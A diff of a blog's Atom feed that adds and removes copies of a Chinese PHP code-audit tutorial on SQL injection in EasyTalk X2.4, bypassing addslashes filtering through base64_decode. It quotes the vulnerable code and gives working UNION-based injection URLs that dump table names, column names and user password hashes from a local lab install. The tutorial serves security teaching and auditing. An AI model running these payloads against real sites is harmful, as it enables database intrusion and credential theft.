@@ -654,6 +654,80 @@ fclose(&lt;span class=&quot;variable&quot;&gt;$fp&lt;/span&gt;);
   
   <entry>
     <title>【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之Base64Decode</title>
+    <link href="http://www.cnbraid.com/2015/01/12/sql2/"/>
+    <id>http://www.cnbraid.com/2015/01/12/sql2/</id>
+    <published>2015-01-12T02:35:00.000Z</published>
+    <updated>2016-01-12T06:03:13.813Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。base64decode()的情况，同样大牛请自觉绕道~&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x02_环境搭建&quot;&gt;0x02 环境搭建&lt;/h2&gt;&lt;p&gt;看背景我们使用了低版本的easytalk程序，版本为X2.4&lt;br&gt;①源码我打包了一份：&lt;a href=&quot;http://pan.baidu.com/s/1bopOFNL&quot; title=&quot;easytalk.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1bopOFNL&lt;/a&gt;&lt;br&gt;②解压到www的easytalk目录下，按照提示一步步安装即可，遇到问题自行百度或谷歌，成功后访问如下图：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x03_漏洞分析&quot;&gt;0x03 漏洞分析&lt;/h2&gt;&lt;p&gt;首先看下源码结构，用的ThinkPHP框架，比较复杂：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_3.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;有兴趣的可以去研究下再继续往下看，新手可以知道ThinkPHP对接收的参数是有过滤的，并且根据你服务器是否开启GPC会做相应的处理：&lt;br&gt;1./ThinkPHP/Extend/Library/ORG/Util/Input.class.php文件第266行：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/**
+ +----------------------------------------------------------
+ * 如果 magic_quotes_gpc 为关闭状态，这个函数可以转义字符串
+ +----------------------------------------------------------
+ * @access public
+ +----------------------------------------------------------
+ * @param string &lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt; 要处理的字符串
+ +----------------------------------------------------------
+ * @&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; string
+ +----------------------------------------------------------
+ */
+static public &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; addSlashes(&lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt;) {
+    if (!get_magic_quotes_gpc()) {
+        &lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt; = addslashes(&lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt;);
+    }
+    return &lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt;;
+}    
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.使用Seay代码审计系统的全局搜索功能，搜索包含关键字为”base64_decode”的文件，发现SettingAction.class.php包含一个对接收的参数keyword进行urldecode的地方：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql02_04.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;3.我们跟进这个php文件，发现虽然使用daddslashes函数进行了注入过滤，但是使用了base64_decode函数对参数auth进行了转码从而可以绕过过滤造成注入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;//认证电子邮件
+public &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; doauth() {
+    $_authmsg=daddslashes($_GET[&lt;span class=&quot;string&quot;&gt;&#39;auth&#39;&lt;/span&gt;]);//再次判断GPC是否开始并进行注入过滤
+    &lt;span class=&quot;variable&quot;&gt;$authmsg&lt;/span&gt;=base64_decode($_authmsg);//base64_decode函数对参数进行转码处理
+    &lt;span class=&quot;variable&quot;&gt;$tem&lt;/span&gt;=explode(&lt;span class=&quot;string&quot;&gt;&quot;:&quot;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$authmsg&lt;/span&gt;);//对解码后的参数authmsg按照“：”进行分割存入数组tem中
+    &lt;span class=&quot;variable&quot;&gt;$send&lt;/span&gt;_id=&lt;span class=&quot;variable&quot;&gt;$tem&lt;/span&gt;[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;];
+    &lt;span class=&quot;variable&quot;&gt;$user&lt;/span&gt;=M(&lt;span class=&quot;string&quot;&gt;&#39;Users&#39;&lt;/span&gt;);
+
+    &lt;span class=&quot;variable&quot;&gt;$row&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$user-&lt;/span&gt;&amp;gt;field(&lt;span class=&quot;string&quot;&gt;&#39;mailadres,auth_email&#39;&lt;/span&gt;)-&amp;gt;where(&lt;span class=&quot;string&quot;&gt;&quot;user_id=&#39;$send_id&#39;&quot;&lt;/span&gt;)-&amp;gt;find();//带入查询，在where子句里，造成注入
+    if ($_authmsg==&lt;span class=&quot;variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;auth_email&#39;&lt;/span&gt;]) {
+        &lt;span class=&quot;variable&quot;&gt;$user-&lt;/span&gt;&amp;gt;where(&lt;span class=&quot;string&quot;&gt;&quot;user_id=&#39;$send_id&#39;&quot;&lt;/span&gt;)-&amp;gt;setField(&lt;span class=&quot;string&quot;&gt;&#39;auth_email&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);
+        setcookie(&lt;span class=&quot;string&quot;&gt;&#39;setok&#39;&lt;/span&gt;, json_encode(array(&lt;span class=&quot;string&quot;&gt;&#39;lang&#39;&lt;/span&gt;=&amp;gt;L(&lt;span class=&quot;string&quot;&gt;&#39;mail6&#39;&lt;/span&gt;),&lt;span class=&quot;string&quot;&gt;&#39;ico&#39;&lt;/span&gt;=&amp;gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)),&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;);
+    } else {
+        setcookie(&lt;span class=&quot;string&quot;&gt;&#39;setok&#39;&lt;/span&gt;, json_encode(array(&lt;span class=&quot;string&quot;&gt;&#39;lang&#39;&lt;/span&gt;=&amp;gt;L(&lt;span class=&quot;string&quot;&gt;&#39;mail7&#39;&lt;/span&gt;),&lt;span class=&quot;string&quot;&gt;&#39;ico&#39;&lt;/span&gt;=&amp;gt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)),&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;);
+    }
+    header(&lt;span class=&quot;string&quot;&gt;&#39;location:&#39;&lt;/span&gt;.SITE_URL.&lt;span class=&quot;string&quot;&gt;&#39;/?m=setting&amp;amp;a=mailauth&#39;&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x04_漏洞证明&quot;&gt;0x04 漏洞证明&lt;/h2&gt;&lt;p&gt;1.我们构造获取数据库相关信息的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;string&quot;&gt;http:&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;//localhost/eazytalk/?m=setting&amp;amp;a=doauth&amp;amp;auth=aGFja2luZycgdW5pb24gc2VsZWN0IHVzZXIoKSwyIw==&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看sql语句发现成功执行：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql02_05.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;但是不能进一步了。。。。&lt;br&gt;查看下MySql日志，发现成功执行了sql语句：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;2.我们构造获取数据库eazytalk所有表的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;http&lt;/span&gt;://localhost/eazytalk/?m=topic&amp;amp;&lt;span class=&quot;operator&quot;&gt;a&lt;/span&gt;=topic&amp;amp;keyword=aaa%&lt;span class=&quot;number&quot;&gt;2527&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, (select GROUP_CONCAT(DISTINCT table_name) &lt;span class=&quot;built_in&quot;&gt;from&lt;/span&gt; information_schema.tables where table_schema=&lt;span class=&quot;number&quot;&gt;0x6561737974616C6B&lt;/span&gt;),&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;%&lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取所有表信息如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;4.构造获取表et_users所有字段信息的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;http&lt;/span&gt;://localhost/eazytalk/?m=topic&amp;amp;&lt;span class=&quot;operator&quot;&gt;a&lt;/span&gt;=topic&amp;amp;keyword=aaa%&lt;span class=&quot;number&quot;&gt;2527&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, (select GROUP_CONCAT(DISTINCT column_name) &lt;span class=&quot;built_in&quot;&gt;from&lt;/span&gt; information_schema.columns where table_name=&lt;span class=&quot;number&quot;&gt;0x65745F7573657273&lt;/span&gt;),&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;%&lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取表et_users所有字段信息如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_10.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;5.构造获取et_users表第一条账户的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;http&lt;/span&gt;://localhost/eazytalk/?m=topic&amp;amp;&lt;span class=&quot;operator&quot;&gt;a&lt;/span&gt;=topic&amp;amp;keyword=aaa%&lt;span class=&quot;number&quot;&gt;2527&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, (select GROUP_CONCAT(DISTINCT user_name,&lt;span class=&quot;number&quot;&gt;0x5f&lt;/span&gt;,password) &lt;span class=&quot;built_in&quot;&gt;from&lt;/span&gt; et_users limit &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;),&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;%&lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取表admin的账户密码如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;本文由HackBraid整理总结，如需转载请联系作者。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。base64decode()的情况，同样大牛请自觉绕道~&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="WEB安全" scheme="http://www.cnbraid.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="PHP" scheme="http://www.cnbraid.com/tags/PHP/"/>
+    
+      <category term="SQL注入" scheme="http://www.cnbraid.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="代码审计" scheme="http://www.cnbraid.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之Base64Decode</title>
     <link href="http://www.cnbraid.com/2015/01/12/sql2-1/"/>
     <id>http://www.cnbraid.com/2015/01/12/sql2-1/</id>
     <published>2015-01-12T02:35:00.000Z</published>
@@ -762,80 +836,6 @@ public &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; doauth() {
     <summary type="html">
     
       &lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。遇到这种情况我们就需要找一些编码解码的函数来绕过全局防护，这篇文章讲base64_decode()的情况，同样大牛请自觉绕道~&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql02_1.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="WEB安全" scheme="http://www.cnbraid.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="PHP" scheme="http://www.cnbraid.com/tags/PHP/"/>
-    
-      <category term="SQL注入" scheme="http://www.cnbraid.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="代码审计" scheme="http://www.cnbraid.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之Base64Decode</title>
-    <link href="http://www.cnbraid.com/2015/01/12/sql2/"/>
-    <id>http://www.cnbraid.com/2015/01/12/sql2/</id>
-    <published>2015-01-12T02:35:00.000Z</published>
-    <updated>2016-01-12T06:03:13.813Z</updated>
-    
-    <content type="html">&lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。base64decode()的情况，同样大牛请自觉绕道~&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;0x02_环境搭建&quot;&gt;0x02 环境搭建&lt;/h2&gt;&lt;p&gt;看背景我们使用了低版本的easytalk程序，版本为X2.4&lt;br&gt;①源码我打包了一份：&lt;a href=&quot;http://pan.baidu.com/s/1bopOFNL&quot; title=&quot;easytalk.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1bopOFNL&lt;/a&gt;&lt;br&gt;②解压到www的easytalk目录下，按照提示一步步安装即可，遇到问题自行百度或谷歌，成功后访问如下图：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;h2 id=&quot;0x03_漏洞分析&quot;&gt;0x03 漏洞分析&lt;/h2&gt;&lt;p&gt;首先看下源码结构，用的ThinkPHP框架，比较复杂：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_3.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;有兴趣的可以去研究下再继续往下看，新手可以知道ThinkPHP对接收的参数是有过滤的，并且根据你服务器是否开启GPC会做相应的处理：&lt;br&gt;1./ThinkPHP/Extend/Library/ORG/Util/Input.class.php文件第266行：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/**
- +----------------------------------------------------------
- * 如果 magic_quotes_gpc 为关闭状态，这个函数可以转义字符串
- +----------------------------------------------------------
- * @access public
- +----------------------------------------------------------
- * @param string &lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt; 要处理的字符串
- +----------------------------------------------------------
- * @&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; string
- +----------------------------------------------------------
- */
-static public &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; addSlashes(&lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt;) {
-    if (!get_magic_quotes_gpc()) {
-        &lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt; = addslashes(&lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt;);
-    }
-    return &lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt;;
-}    
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.使用Seay代码审计系统的全局搜索功能，搜索包含关键字为”base64_decode”的文件，发现SettingAction.class.php包含一个对接收的参数keyword进行urldecode的地方：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql02_04.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;3.我们跟进这个php文件，发现虽然使用daddslashes函数进行了注入过滤，但是使用了base64_decode函数对参数auth进行了转码从而可以绕过过滤造成注入：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;//认证电子邮件
-public &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; doauth() {
-    $_authmsg=daddslashes($_GET[&lt;span class=&quot;string&quot;&gt;&#39;auth&#39;&lt;/span&gt;]);//再次判断GPC是否开始并进行注入过滤
-    &lt;span class=&quot;variable&quot;&gt;$authmsg&lt;/span&gt;=base64_decode($_authmsg);//base64_decode函数对参数进行转码处理
-    &lt;span class=&quot;variable&quot;&gt;$tem&lt;/span&gt;=explode(&lt;span class=&quot;string&quot;&gt;&quot;:&quot;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$authmsg&lt;/span&gt;);//对解码后的参数authmsg按照“：”进行分割存入数组tem中
-    &lt;span class=&quot;variable&quot;&gt;$send&lt;/span&gt;_id=&lt;span class=&quot;variable&quot;&gt;$tem&lt;/span&gt;[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;];
-    &lt;span class=&quot;variable&quot;&gt;$user&lt;/span&gt;=M(&lt;span class=&quot;string&quot;&gt;&#39;Users&#39;&lt;/span&gt;);
-
-    &lt;span class=&quot;variable&quot;&gt;$row&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$user-&lt;/span&gt;&amp;gt;field(&lt;span class=&quot;string&quot;&gt;&#39;mailadres,auth_email&#39;&lt;/span&gt;)-&amp;gt;where(&lt;span class=&quot;string&quot;&gt;&quot;user_id=&#39;$send_id&#39;&quot;&lt;/span&gt;)-&amp;gt;find();//带入查询，在where子句里，造成注入
-    if ($_authmsg==&lt;span class=&quot;variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;auth_email&#39;&lt;/span&gt;]) {
-        &lt;span class=&quot;variable&quot;&gt;$user-&lt;/span&gt;&amp;gt;where(&lt;span class=&quot;string&quot;&gt;&quot;user_id=&#39;$send_id&#39;&quot;&lt;/span&gt;)-&amp;gt;setField(&lt;span class=&quot;string&quot;&gt;&#39;auth_email&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);
-        setcookie(&lt;span class=&quot;string&quot;&gt;&#39;setok&#39;&lt;/span&gt;, json_encode(array(&lt;span class=&quot;string&quot;&gt;&#39;lang&#39;&lt;/span&gt;=&amp;gt;L(&lt;span class=&quot;string&quot;&gt;&#39;mail6&#39;&lt;/span&gt;),&lt;span class=&quot;string&quot;&gt;&#39;ico&#39;&lt;/span&gt;=&amp;gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)),&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;);
-    } else {
-        setcookie(&lt;span class=&quot;string&quot;&gt;&#39;setok&#39;&lt;/span&gt;, json_encode(array(&lt;span class=&quot;string&quot;&gt;&#39;lang&#39;&lt;/span&gt;=&amp;gt;L(&lt;span class=&quot;string&quot;&gt;&#39;mail7&#39;&lt;/span&gt;),&lt;span class=&quot;string&quot;&gt;&#39;ico&#39;&lt;/span&gt;=&amp;gt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)),&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;);
-    }
-    header(&lt;span class=&quot;string&quot;&gt;&#39;location:&#39;&lt;/span&gt;.SITE_URL.&lt;span class=&quot;string&quot;&gt;&#39;/?m=setting&amp;amp;a=mailauth&#39;&lt;/span&gt;);
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x04_漏洞证明&quot;&gt;0x04 漏洞证明&lt;/h2&gt;&lt;p&gt;1.我们构造获取数据库相关信息的POC：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;string&quot;&gt;http:&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;//localhost/eazytalk/?m=setting&amp;amp;a=doauth&amp;amp;auth=aGFja2luZycgdW5pb24gc2VsZWN0IHVzZXIoKSwyIw==&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看sql语句发现成功执行：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql02_05.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;但是不能进一步了。。。。&lt;br&gt;查看下MySql日志，发现成功执行了sql语句：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;2.我们构造获取数据库eazytalk所有表的POC：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;http&lt;/span&gt;://localhost/eazytalk/?m=topic&amp;amp;&lt;span class=&quot;operator&quot;&gt;a&lt;/span&gt;=topic&amp;amp;keyword=aaa%&lt;span class=&quot;number&quot;&gt;2527&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, (select GROUP_CONCAT(DISTINCT table_name) &lt;span class=&quot;built_in&quot;&gt;from&lt;/span&gt; information_schema.tables where table_schema=&lt;span class=&quot;number&quot;&gt;0x6561737974616C6B&lt;/span&gt;),&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;%&lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取所有表信息如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;4.构造获取表et_users所有字段信息的POC：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;http&lt;/span&gt;://localhost/eazytalk/?m=topic&amp;amp;&lt;span class=&quot;operator&quot;&gt;a&lt;/span&gt;=topic&amp;amp;keyword=aaa%&lt;span class=&quot;number&quot;&gt;2527&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, (select GROUP_CONCAT(DISTINCT column_name) &lt;span class=&quot;built_in&quot;&gt;from&lt;/span&gt; information_schema.columns where table_name=&lt;span class=&quot;number&quot;&gt;0x65745F7573657273&lt;/span&gt;),&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;%&lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取表et_users所有字段信息如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_10.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;5.构造获取et_users表第一条账户的POC：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;http&lt;/span&gt;://localhost/eazytalk/?m=topic&amp;amp;&lt;span class=&quot;operator&quot;&gt;a&lt;/span&gt;=topic&amp;amp;keyword=aaa%&lt;span class=&quot;number&quot;&gt;2527&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, (select GROUP_CONCAT(DISTINCT user_name,&lt;span class=&quot;number&quot;&gt;0x5f&lt;/span&gt;,password) &lt;span class=&quot;built_in&quot;&gt;from&lt;/span&gt; et_users limit &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;),&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;%&lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取表admin的账户密码如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;本文由HackBraid整理总结，如需转载请联系作者。&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。base64decode()的情况，同样大牛请自觉绕道~&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
     
     </summary>
     
